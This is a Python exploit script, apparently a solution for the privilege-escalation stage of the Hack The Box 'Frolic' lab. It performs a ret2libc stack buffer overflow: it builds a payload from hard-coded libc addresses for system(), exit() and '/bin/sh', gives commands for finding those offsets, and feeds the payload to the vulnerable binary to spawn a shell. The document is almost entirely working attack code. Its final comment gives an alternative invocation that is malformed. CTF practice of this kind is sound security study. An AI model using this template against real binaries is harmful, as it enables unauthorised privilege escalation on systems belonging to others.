#!/usr/bin/python

## Script Author: Bryan Rodriguez Martin
## Description: Exploit for a Linux 32-bit LSB executable (Little Endian) without ASLR protection 
##              from Hackthebox.eu. The binary is found in the priv esc part of the Frolic box.
##              Using the Ret2lib or return-to-libc method to defeat stack protection, the objective 
##              is to overwrite the previous return value with the machine’s address for system(),
##              and overwrite the caller function’s stack frame with the address of /bin/sh.

from subprocess import call
import struct

# ldd binary_path | grep libc
libc_base_addr  = 0xb7e19000

# Grab system offset (EXAMPLE: system@@GLIBC_2.0 )
# readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
system_off = 0x0003ada0

# Grab exit offset (EXAMPLE: exit@@GLIBC_2.0 )
# readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
exit_off = 0x0002e9d0

# Grab sh offset (EXAMPLE: /bin/sh )
# strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
arg_off = 0x0015ba0b

system_addr = struct.pack("<I",libc_base_addr+system_off)
exit_addr = struct.pack("<I",libc_base_addr+exit_off)
arg_addr = struct.pack("<I",libc_base_addr+arg_off)

buf = "A" * 52
buf += system_addr
buf += exit_addr
buf += arg_addr

#print (buf)

#In this case the binary needs an argument, that's where the BOF is. So let's execute the binary and give our buf as parameter.
ret = call(['binary_path', buf])

# Another option to exploit this binary is:
# ./rop `python -c 'exploit.py'`
